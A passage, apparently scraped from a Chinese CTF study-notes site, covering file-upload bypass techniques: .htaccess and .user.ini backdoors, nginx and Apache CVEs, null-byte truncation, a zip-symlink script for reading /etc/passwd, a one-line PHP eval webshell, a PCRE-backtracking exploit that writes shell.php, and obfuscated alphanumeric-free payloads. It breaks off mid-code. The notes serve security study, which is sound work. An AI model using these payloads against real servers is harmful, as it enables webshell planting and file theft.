<p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_3","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>\u5173\u4e8e\u8fd9\u4e2a\u6211\u81ea\u5df1\u6709\u70b9\u7b14\u8bb0</p> <p>.htaccess\u6587\u4ef6(\u6216\u8005\"\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6\"\uff09</p> <p>,\u5168\u79f0\u662fHypertextAccess(\u8d85\u6587\u672c\u5165\u53e3)\u3002\u63d0\u4f9b\u4e86\u9488\u5bf9\u76ee\u5f55\u6539\u53d8\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c \u5373\uff0c\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u6587\u6863\u76ee\u5f55\u4e2d\u653e\u7f6e\u4e00\u4e2a\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u4ee4\u7684\u6587\u4ef6\uff0c\u4ee5\u4f5c\u7528\u4e8e\u6b64\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\u3002\u4f5c\u4e3a\u7528\u6237\uff0c\u6240\u80fd\u4f7f\u7528\u7684\u547d\u4ee4\u53d7\u5230\u9650\u5236\u3002\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7Apache\u7684AllowOverride\u6307\u4ee4\u6765\u8bbe\u7f6e\u3002.htaccess\u662f\u4e00\u4e2a\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u5b58\u653e\u7740\u4e00\u4e9bapache\u6307\u4ee4\uff0c\u4e0ehttpd.conf\u7c7b\u4f3c\uff0c\u4f46\u4f5c\u7528\u8303\u56f4\u4ec5\u9650\u5f53\u524d\u76ee\u5f55\u3002</p> <p>.htaccess\u662f\u5728\u7528\u6237\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u7ad9\u70b9\u65f6\u52a0\u8f7d\u7684\uff0c\u4e0d\u9700\u8981\u91cd\u542fapache\u670d\u52a1\u8fdb\u884c\u8f7d\u5165\uff0c\u66f4\u7075\u6d3b\u4f46\u66f4\u8017\u7cfb\u7edf\u8d44\u6e90\u3002\u7531\u4e8e.htaccess\u53ef\u4ee5\u914d\u7f6e\u5f88\u591a\u4e1c\u897f\uff0c\u5982\u76ee\u5f55\u8bbf\u95ee\u3001\u6587\u4ef6\u6267\u884c\u3001\u9519\u8bef\u9875\u9762\u91cd\u5b9a\u5411\u7b49</p> <p>\u7a0d\u5fae\u4e3e\u4e2a\u4f8b\u5b57\uff1a</p> <p> <p>SetHandlerapplication/x-httpd-php</p> <p>//\u6216\u8005\u5e72\u8106\u4e0d\u8981FilesMatch,\u8fd9\u91cc\u7684\u610f\u601d\u662f\u914d\u7f6e\uff0c\u5982\u679c\u5305\u542b1\uff0c\u5219\u5c06\u5176\u89c6\u4e3aphp\u6587\u4ef6\u6267\u884c</p> <p>\u5728PHP\u4e2d\u6709\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\u53eb.user.ini\uff0c\u6709\u70b9\u7c7b\u4f3c.htaccess\u6587\u4ef6\uff0cPHP\u4f1a\u5728\u6bcf\u4e2a\u76ee\u5f55\u4e0b\u626b\u63cfINI\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7.user.ini\u6587\u4ef6\u6765\u5b9e\u73b0\u9690\u85cf\u540e\u95e8\u7684\u6548\u679c</p> <p>\u5728.user.ini\u4e2d\u53ef\u4ee5\u8bc6\u522bPHP_INI_PERDIR\u548cPHP_INI_USER\u6a21\u5f0f\u7684INI\u8bbe\u7f6e</p> <p>\u5173\u4e8ePHP_INI_*\u4e00\u5171\u6709\u56db\u79cd\uff1a</p> <p>PHP_INI_USER \u53ef\u5728\u7528\u6237\u811a\u672c\u4ee5\u53ca.user.ini\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_PERDIR \u53ef\u5728php.ini\uff0c.htaccess\u6216httpd.conf\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_SYSTEM \u53ef\u5728php.ini\u6216httpd.conf\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_ALL \u53ef\u5728\u4efb\u4f55\u5730\u65b9\u8bbe\u5b9a</p> <p>auto_prepend_file</p> <p>\u8be5\u914d\u7f6e\u9879\u4f1a\u8ba9php\u6587\u4ef6\u5728\u6267\u884c\u524d\u5148\u5305\u542b\u4e00\u4e2a\u6307\u5b9a\u7684\u6587\u4ef6\uff0c\u901a\u8fc7\u8fd9\u4e2a\u914d\u7f6e\u9879\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6765\u9690\u85cf\u81ea\u5df1\u7684\u540e\u95e8</p> <p>\u5c31\u8fd9\u4e2a\u73a9\u610f\u513f\uff0c\u53ef\u4ee5\u5728\u4e0d\u4e0a\u4f20php\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\u5236\u9020\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u51fa\u6765</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6\u76f4\u63a5\u8986\u76d6\u6389\u4e86\u7cfb\u7edf\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u79cd\u5371\u5bb3\u8fd8\u662f\u975e\u5e38\u5927\u7684\u3002</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_4","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>CVE-2017-15715</p> <ul> <li>\u5229\u7528\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u6587\u4ef6\u540d\u4e4b\u540e\u6dfb\u52a0\u4e00\u4e2a\\x0a\u6765\u7ed5\u8fc7\u9ed1\u540d\u5355\u4e0a\u4f20\u7684\u9650\u5236</li> </ul>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#nginx","title":"nginx","text":"<p>CVE-2013-4547</p> <ul> <li>\u53c2\u8003https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547</li> </ul> <p>\u5373\u4e0a\u4f20\u4e00\u4e2a1.gif\uff0c\u7136\u540e\u8bbf\u95ee1.gif[0x20][0x00].php([0x20][0x00]\u4e3a\u7a7a\u683c\u548c\\0\u4e0d\u9700\u8981url\u7f16\u7801)\uff0c1.gif\u4f1a\u88ab\u5f53\u4f5cphp\u89e3\u6790</p> <p>php-cgi\u6f0f\u6d1e</p> <ul> <li>\u5728php\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u5f00\u542f\u4e86cgi.fix_pathinfo\uff0c\u5bfc\u81f4\u56fe\u7247\u9a6c1.jpg\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee1.jpg/.php\u89e3\u6790\u6210php</li> </ul> <p>.user.ini</p> <ul> <li>\u5f53\u4f7f\u7528CGI\uff0fFastCGI \u6765\u89e3\u6790php\u65f6\uff0cphp\u4f1a\u4f18\u5148\u641c\u7d22\u76ee\u5f55\u4e0b\u6240\u6709\u7684.ini\u6587\u4ef6\uff0c\u5e76\u5e94\u7528\u5176\u4e2d\u7684\u914d\u7f6e\u3002\u7c7b\u4f3c\u4e8eapache\u7684.htaccess\uff0c\u4f46\u8bed\u6cd5\u4e0e.htacces\u4e0d\u540c\uff0c\u8bed\u6cd5\u4e0ephp.ini\u4e00\u81f4\u3002\u56e0nginx\u5b9e\u9645\u4e0a\u53ea\u662f\u8d77\u5230\u8f6c\u53d1\u7684\u4f5c\u7528\uff0c\u5b9e\u9645\u89e3\u6790\u4e00\u822c\u4e3aphp-fpm\u6216fastcgi\u6765\u89e3\u6790\uff0c\u6240\u4ee5\u5728.user.ini\u4e2d\u5199\u5982auto_prepend_file=test.jpg\uff0c\u4e4b\u540e\u4e0a\u4f20.user.ini\u4e0etest.jpg\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7b49\u5f85.user.ini\u88ab\u52a0\u8f7d\u540e\uff0c\u4f1a\u5bfc\u81f4\u6bcf\u4e2aphp\u6587\u4ef6\u89e3\u6790\u4e4b\u524d\u5148\u5c06test.jpg\u5f53\u4f5cphp\u89e3\u6790\u3002</li> </ul>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#php","title":"php","text":"<p>00\u622a\u65ad</p> <p>php \u7248\u672c\u4e3a5.2.x\uff0c\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\u5728\u6587\u4ef6\u540e\u540d\u540e\u8ffd\u52a0\\0\u5373\u53ef\u8ba9\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u6700\u7ec8\u53d8\u4e3a\u4ee5.php\u7ed3\u5c3e\u7684\u6587\u4ef6</p> <p>fopen\u7279\u6027</p> <pre><code>&lt;?php$filename='shell.php/.';$content=\"&lt;?php phpinfo();\";$f = fopen($filename, 'w');    fwrite($f, $content);    fclose($f);?&gt; //\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u751f\u6210shell.php\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u770b\u8d77\u6765\u597d\u7528\uff0c\u5b9e\u9645\u4e0a\u5012\u6ca1\u6709\u7528\u7684\u90a3\u4e48\u591a\uff0c\u8fd9\u4e2a\u662fphp\u8bed\u8a00\u7684\u89e3\u6790\u6f0f\u6d1e\u3002</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#zip","title":"zip\u8f6f\u94fe\u63a5\u6267\u884c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"<pre><code>#coding=utf-8\nimport os\nimport requests\nimport sys\nurl = ''\ndef makezip():\nos.system('ln -s '+sys.argv[1]+' exp')\nos.system('zip --symlinks exp.zip exp')\nmakezip()\nfiles = {'the_file':open('./exp.zip','rb')}\ndef exploit():\nres = requests.post(url,files=files)\nprint(res.text)\nexploit()\nos.system('rm -rf exp')\nos.system('rm -rf exp.zip')\nPlain Text\n</code></pre> <p>\u5148copy\u4e00\u4e0b\u6240\u7528\u5230\u7684\u811a\u672c\u539f\u7406\u4e4b\u540e\u518d\u89e3\u91ca</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_5","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>\u539f\u7406\u5f88\u7b80\u5355\uff0c\u5229\u7528linux\u91cc\u9762\u7684\u8f6f\u94fe\u63a5\u6765\u94fe\u63a5\u5f53\u524d\u7528\u6237\u4e0b\u7684\u6587\u6863\uff0c\u7136\u540e\u5f53\u6211\u4eec\u8bfb\u53d6\u8bbf\u95ee\u65f6\u4f1a\u663e\u793a\u6587\u4ef6\u4e2d\uff08\u5305\u62ec\u8def\u5f84\u4e2d\u7684\uff09\u5185\u5bb9\uff0c\u76f8\u5f53\u4e8e\u6587\u4ef6\u4e0a\u4f20\u540e\u8fbe\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u3002</p> <p>\u81f3\u4e8e\u8f6f\u94fe\u63a5\uff0c\u76f4\u63a5\u7406\u89e3\u7c7b\u4f3cwindows\u4e0b\u7684\u5feb\u6377\u65b9\u5f0f\uff0c\u6027\u8d28\u4e0a\u4f1a\u6709\u70b9\u4e0d\u540c</p> <p>\u5e73\u5e38\u7ecf\u5e38\u4f1a\u4f7f\u7528\u7684\u547d\u4ee4\u5c31\u662f</p> <p>ln -s \u8def\u5f84a \u8def\u5f84b\uff0c \u4e5f\u4f1a\u4e00\u822c\u7528\u4e8e\u5c06\u4f60\u81ea\u5b9a\u4e49\u7684\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5230\u7cfb\u7edf\u547d\u4ee4\u4e2d\uff0c\u4e4b\u540e\u6309tab\u53ef\u4ee5\u8865\u5168</p> <p>\u4e0a\u9762\u811a\u672c\u7684\u5229\u7528\u65b9\u5f0f\u4e3a</p> <p>python3 jiaoben /etc/passwd/</p> <p>\u53ef\u4ee5\u8bfb\u53d6\u5230\u8def\u5f84\u5185\u5185\u5bb9</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#thinkphp600-601","title":"Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>thinkphp\u7684\u6f0f\u6d1e\u611f\u89c9\u786e\u5b9e\u662f\u5f88\u591a\u3002</p> <p>\u7b80\u5355\u7684\u6982\u62ec\u5c31\u662f\u7531\u4e8e\u5b83\u81ea\u5df1\u7684\u4ee3\u7801\u903b\u8f91\u6709\u95ee\u9898\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u62ff\u5230shell</p> <p>2020\u5e741\u670810\u65e5\uff0cThinkPHP\u56e2\u961f\u53d1\u5e03\u4e00\u4e2a\u8865\u4e01\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u7531\u4e0d\u5b89\u5168\u7684SessionId\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u64cd\u4f5c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u5728\u76ee\u6807\u73af\u5883\u542f\u7528session\u7684\u6761\u4ef6\u4e0b\u521b\u5efa\u4efb\u610f\u6587\u4ef6\u4ee5\u53ca\u5220\u9664\u4efb\u610f\u6587\u4ef6\uff0c\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u8fd8\u53ef\u4ee5getshell\u3002</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u800c<code>$sessionId</code>\u662fcookie\u4e2d\u540d\u4e3aPHPSESSID\u7684\u503c\uff0c\u56e0\u6b64\u662f\u653b\u51fb\u8005\u53ef\u63a7\u7684\uff0c\u4ece\u800c\u5bfc\u81f4\u5199\u5165\u7684\u6587\u4ef6\u540d\u53ef\u63a7\u3002</p> <p>\u539f\u7406\u9898\uff1a</p> <p>[GYCTF2020]EasyThinking</p> <p>\u9996\u5148\u6253\u5f00\u9898\u76ee\u6ce8\u518c\u540e\u5728url\u4e0a\u4e71\u8f93\u4e86\u4e00\u901a\uff1a</p> <p></p> <p>get\u5230\u4e86\u6846\u67b6\u7684\u7248\u672c\uff0c\u76f4\u89c9\u544a\u8bc9\u6211\u4eec\u4e00\u822c\u90fd\u662f\u67d0\u4e2a\u8865\u4e01\u3002\u641c\u5230\u4e86\u4e0a\u9762\u7684thinkphp6.0.0\u7684\u6587\u4ef6\u540d\u4e0a\u4f20\u3002</p> <p>\u7136\u540e\u8fd8\u6709\u4e00\u4e2asearch\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u80fd\u591fpost\u6570\u636e\u4e0a\u53bb\u3002</p> <p></p> <p>\u81f3\u4e8e\u4fdd\u5b58\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e2awww.zip\u53ef\u4ee5\u770b\u5230\u3002</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f\u6b63\u5e38\u60c5\u51b5\u4e0b\u90a3\u5c31\u7528\u8681\u5251\u6765\u8fde\u63a5\uff0c\u8fde\u63a5\u4e4b\u540e\u7684\u754c\u9762\u8fd9\u6837\uff0c\u6709\u4e2a./readflag\uff0c\u4f46\u7531\u4e8e\u662fdisable_function\uff0c\u4e00\u822c\u547d\u4ee4\u90fd\u8fc7\u4e0d\u4e86\u3002</p> <p>\u4e4b\u540e\u7528\u5230ld_preload\u8fdb\u7a0b\u6ce8\u5165\u7684\u7ed5\u8fc7\uff0c\u539f\u7406\u4e4b\u524d\u505a\u679c\u4e00\u4e9b\u603b\u7ed3\uff0c\u8fd9\u91cc\u4e0d\u8d58\u8ff0\uff0c\u76f4\u63a5\u7528\u8681\u5251\u4e0a\u7684\u63d2\u4ef6\u3002</p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/","title":"\u6587\u4ef6\u4e0a\u4f20\u57fa\u7840","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>[\u6781\u5ba2\u5927\u6311\u6218 2019]Upload</p> <p>\u4e0d\u662f\u7279\u522b\u597d\u5199\u5165\u95e8\u7ea7\u7684\u603b\u7ed3\uff0c\u5148\u62ff\u4e2a\u4f8b\u5b50\u6765\u505a\u505a</p> <p></p> <p>\u968f\u4fbf\u62ff\u5f20\u56fe\u7247\u4e0a\u4f20\u6293\u5305\u3002\u4e0a\u4f20\u53d1\u73b0\u4e0d\u6210\u529f\uff08\u6211\u660e\u660e\u62ff\u7684\u662f\u4e00\u5f20\u56fe\u7247\uff09</p> <p>\u90a3\u5c31\u770b\u770b\u5b83\u8fc7\u6ee4\u70b9\u5728\u54ea\u3002</p> <p>\u5f04\u4e2a\u80fd\u4e0a\u4f20\u7684\u6587\u4ef6\u7136\u540e\u4fee\u6539\u4e0a\u4f20\u5185\u5bb9\u4e3a</p> <p></p> <p>\u4f46\u662f\u540e\u7f00\u540d\u4e3ajepg\u80af\u5b9a\u662f\u4e0d\u80fd\u89e3\u6790\u6267\u884c\u7684\uff0c\u4f46\u5c1d\u8bd5php\u4e5f\u4e0d\u884c</p> <p>\u6700\u7ec8\u4e3aphtml\uff1a\u8001\u7248\u672cphp\u7684\u4e00\u79cd\u540e\u7f00\u683c\u5f0f</p> <p>\u4e0a\u4f20\u6728\u9a6c\u6210\u529f</p> <p>\u987a\u4fbf\u63d0\u4e00\u53e5\uff1aGIF89a</p> <p>GIF89a\u56fe\u7247\u5934\u6587\u4ef6\u6b3a\u9a97\uff0c\u662f\u4e00\u79cd\u653b\u51fb\uff0cGIF89a\u56fe\u5f62\u6587\u4ef6\u662f\u4e00\u4e2a\u6839\u636e\u56fe\u5f62\u4ea4\u6362\u683c\u5f0f\uff08GIF\uff0989a\u7248\u8fdb\u884c\u683c\u5f0f\u5316\u4e4b\u540e\u7684\u56fe\u5f62\u3002</p> <p>\u6709\u7684\u670d\u52a1\u5668\u89e3\u6790\u4e0d\u4e00\u5b9a\u662f\u8fd9\u4e2a\u6bd4\u5982\u67d0\u4e9b\u8bc6\u522b\u7684\u662fPNG\u7684\u6587\u4ef6\u5934\uff0c\u4e5f\u5c31\u662f\u90a3\u4e2aGIF89a\u6539\u6210PNG</p> <p>\u6587\u4ef6\u4e0a\u4f20\u7684\u57fa\u672c\u4fee\u6539\u7684\u53c2\u6570\u5c31\u662f\u56fe\u4e2d\u7684</p> <p>filename\u7684\u540e\u7f00</p> <ul> <li> <p>Content-Type\u7684\u683c\u5f0f\uff0c\u4e00\u822c\u4fee\u6539\u4e3aimage/jpeg\uff0c\u89c6\u60c5\u51b5\u800c\u5b9a</p> </li> <li> <p>\u6587\u4ef6\u5934</p> </li> <li> <p>\u4e0a\u4f20\u6570\u636e\u7684\u5185\u5bb9\uff0c\u6bd4\u5982\u8fd9\u9898\u5c31\u8fc7\u6ee4\u4e86\"&lt;?\"\u5bfc\u81f4&lt;?php @eval($_POST(\"aa\"));?&gt;\u7528\u4e0d\u4e86</p> </li> <li> <p>\u7136\u540e\u662f\u731c\u6587\u4ef6\u4e0a\u4f20\u7684\u8def\u5f84\uff08\u4e5f\u53ef\u4ee5\u8def\u5f84\u626b\u63cf\u626b\u540e\u592a\u626b\u51fa\u6765\uff09\uff0c\u6211\u4eec\u8bbf\u95ee\u5b83\uff08\u76f8\u5f53\u4e8e\u8c03\u7528\u5b83\u5f53\u4f5cphp\u6587\u4ef6\u6267\u884c\uff09\u540e\u6253\u5f00\u4e86\u4e00\u4e2a\u53cd\u5f39\u7684shell</p> </li> </ul> <p>\u7136\u540e\u4e0a\u4f20\u7684\u8def\u5f84\u4e00\u822c\u4e3aupload/\u6587\u4ef6\u540d       uploaded/\u6587\u4ef6\u540d</p> <p>\uff08\u5c31\u8ddf\u731c\u6d4b\u7ba1\u7406\u5458\u7684\u7528\u6237\u540d\u79f0\u4e3aadmin\u662f\u4e00\u4e2a\u9053\u7406\uff09</p> <p>\u8fd9\u91cc\u662f/upload/a.phtml\u627e\u5230\u540e\u8fde\u63a5\uff0c\u76f8\u5f53\u4e8e\u4f60\u5df2\u7ecf\u62ff\u5230\u4e86\u76ee\u6807\u7cfb\u7edf\u7684\u63a7\u5236\u6743\u9650</p> <p></p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_2","title":"\u4e0a\u4f20\u7ed5\u8fc7\u59ff\u52bf","text":""},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_3","title":"\u524d\u7aef\u4e0a\u4f20\u8fc7\u6ee4","text":"<p>\u524d\u7aef\u5bf9\u6587\u4ef6\u540e\u7f00\u8fdb\u884c\u68c0\u67e5\uff0c\u8be5\u79cd\u901a\u8fc7\u6293\u5305\u4fee\u6539\u6570\u636e\u5305\u5373\u53ef\u89e3\u51b3\u3002</p> <p>\u6240\u8c13\u7684\u524d\u7aef\u5c31\u662f\u4f60\u6240\u770b\u5230\u7684\u6d4f\u89c8\u5668\u7684\u9875\u9762\uff0c\u4ed6\u628a\u8fc7\u6ee4\u51fd\u6570\u4e5f\u4e00\u8d77\u4f20\u8fc7\u6765\u6267\u884c\uff0c</p> <p>\u8fd9\u4e2a\u7b80\u5355\uff0c\u751a\u81f3\u4f60F12\u628a\u90a3\u6bb5\u8fc7\u6ee4\u7684\u4ee3\u7801\u5220\u9664\u90fd\u884c</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_4","title":"\u6587\u4ef6\u540d\u68c0\u67e5","text":"<p>\u5927\u5c0f\u5199\u7ed5\u8fc7</p> <ul> <li>\u5728windows\u4e0b\uff0c\u53ef\u4ee5\u5c06\u540e\u7f00\u5199\u4e3apHp</li> </ul> <p>unicode</p> <ul> <li>\u5f53\u76ee\u6807\u5b58\u5728json_decode\u4e14\u68c0\u67e5\u5728json_decode\u4e4b\u524d,\u53ef\u4ee5\u5c06php\u5199\u4e3a\\u0070hp</li> </ul> <p>php3457</p> <ul> <li>\u8be5\u9879\u4e3aapache\u4e13\u5c5e</li> </ul> <p>\u5173\u952e\u70b9\u5728<code>/etc/apache2/mods-available/php5.6.conf</code>\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6ee1\u8db3<code>.+\\.ph(p[3457]?|t|tml)$</code>\uff0c\u90fd\u4f1a\u88ab\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790\u3002\u5728apache2\u76ee\u5f55\u4e0b<code>grep -r x-httpd-php /etc/apache2</code>\u627e\u5230\u5bf9\u5e94\u6587\u4ef6\u5c31\u80fd\u77e5\u9053\u89e3\u6790\u54ea\u4e9b\u540e\u7f00</p> <p></p> <p>\u5229\u7528\u6b63\u5219\u56de\u6eafpcre\u9650\u5236</p> <ul> <li>\u8fd9\u4e2a\u4e4b\u524d\u63d0\u8d77\u5230\u8fc7</li> </ul> <p>pcre\u9ed8\u8ba4\u9650\u5236\u4e3a100w</p> <p>\u6709\u5982\u4e0b\u573a\u666f</p> <pre><code>&lt;?phpif(!preg_match('/.+?ph/is',$_POST['n']))file_put_contents($_POST['n'],$_POST['s']);\nPlain Text\n</code></pre> <p>\u53ef\u5229\u7528\u5982\u4e0bexp\u89e3\u51b3</p> <pre><code>import requests\ndata= {'n':\"php://filter/write=convert.base64-decode/\"+'/'*1000000+'/resource=shell.php','s':\"PD9waHAgcGhwaW5mbygpPz4=\"}######\u6240\u4ee5\u6211\u8bf4\u662f100wprint (requests.post('http://127.0.0.1',data=data).text)\nPlain Text\n</code></pre>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_5","title":"\u8bf7\u6c42\u5934\u68c0\u67e5","text":"<p>\u5c06php\u6587\u4ef6\u7684<code>content-type:application/octet-stream</code>\u4fee\u6539\u4e3a<code>image/png</code>\u7b49\u5c31\u53ef\u4ee5</p> <p>\u9644\u4e0a\u4e00\u4e2a\u67e5\u627e\u7684\u7f51\u7ad9</p> <p>HTTP Content-type \u5bf9\u7167\u8868</p> <p>OSCHINA.NET\u5728\u7ebf\u5de5\u5177,ostools\u4e3a\u5f00\u53d1\u8bbe\u8ba1\u4eba\u5458\u63d0\u4f9b\u5728\u7ebf\u5de5\u5177\uff0c\u63d0\u4f9bjsbin\u5728\u7ebf CSS\u3001JS \u8c03\u8bd5\uff0c\u5728\u7ebf Java API\u6587\u6863,\u5728\u7ebf PHP API\u6587\u6863,\u5728\u7ebf Node.js API\u6587\u6863,Less CSS\u7f16\u8bd1\u5668\uff0cMarkDown\u7f16\u8bd1\u5668\u7b49\u5176\u4ed6\u5728\u7ebf\u5de5\u5177</p> <p>https://tool.oschina.net/commons/</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_6","title":"\u6587\u4ef6\u5185\u5bb9\u68c0\u67e5","text":"<p>\u7ed5\u8fc7&lt;?php,&lt;?=</p> <p>https://www.php.net/manual/zh/language.basic-syntax.phpmode.php</p> <p></p> <p>\u5176\u4e2d\u7b2c2\u79cd\u5728php7\u79cd\u4e0d\u53ef\u4ee5\u4f7f\u7528\uff0c\u5728php5\u4e2d\u53ef\u4ee5\u4f7f\u7528</p> <p>\u5176\u5b9e\u5c31\u662f\u4e00\u53e5\u8bdd\u6728\u9a6c\u76844\u79cd\u5199\u6cd5\uff08\u8334\u5b57\u76844\u79cd\u5199\u6cd5\uff0c\u4f60\u77e5\u9053\u4e48...\uff09</p> <p>\u7ed5\u8fc7[a-zA-Z0-9]</p> <p>\u4e00\u4e9b\u4e0d\u5305\u542b\u6570\u5b57\u548c\u5b57\u6bcd\u7684webshell | \u79bb\u522b\u6b4c</p> <p>phith0n\u7684\u5c0f\u7ad9\uff0c\u957f\u671f\u5b58\u5728\u4e0e\u5206\u4eab\u5173\u4e8e\u7f51\u7edc\u5b89\u5168\u4e0e\u5404\u79cd\u7f16\u7a0b\u7684\u539f\u521b\u6587\u7ae0\u3002</p> <p>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</p> <p>\u65e0\u5b57\u6bcd\u6570\u5b57webshell\u4e4b\u63d0\u9ad8\u7bc7 | \u79bb\u522b\u6b4c</p> <p>phith0n\u7684\u5c0f\u7ad9\uff0c\u957f\u671f\u5b58\u5728\u4e0e\u5206\u4eab\u5173\u4e8e\u7f51\u7edc\u5b89\u5168\u4e0e\u5404\u79cd\u7f16\u7a0b\u7684\u539f\u521b\u6587\u7ae0\u3002</p> <p>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</p> <p>\ud83d\udc46\u8fd9\u4e2a\u786e\u5b9e\u662f\u4e2a\u5927\u795e</p> <p>\u4ec5\u6570\u5b57+\u7b26\u53f7</p> <ul> <li>waf\u4ee3\u7801\u5982\u4e0b\uff1a</li> </ul> <pre><code>&lt;?php error_reporting(0); if(!isset($_GET['num'])){     show_source(__FILE__); }else{     $str = $_GET['num'];     $blacklist = ['[a-z]', '[\\x7f-\\xff]', '\\s',\"'\", '\"', '`', '\\[', '\\]','\\$', '_', '\\\\\\\\','\\^', ','];     foreach ($blacklist as $blackitem) {         if (preg_match('/' . $blackitem . '/im', $str)) {             die(\"what are you want to do?\");         }     }     @eval('echo '.$str.';'); } ?&gt;\nPlain Text\n</code></pre> <p>\u4f7f\u7528\u5982\u4e0b</p> <pre><code>&lt;?php $a ='';$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(9)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}));$a .= (((10000000000000000000).(1)){3});$a .= ((((10000000000000000000).(1)){3})|(((-1).(1)){0}));echo $a; //systEm?&gt;\n&lt;?php $a ='';$a .= (((10000000000000000000).(1)){3}); // E$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(6)){1}))); //n$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(6)){1}))); //Decho $a; //EnD?&gt;\n&lt;?php // getallheaders$a ='';$a .= ((((10000000000000000000).(1)){3})|(((1.1).(1)){1})&amp;((~(((1).(8)){1})|(((1).(7)){1})))); // g$a .= (((10000000000000000000).(1)){3}); // E$a .= 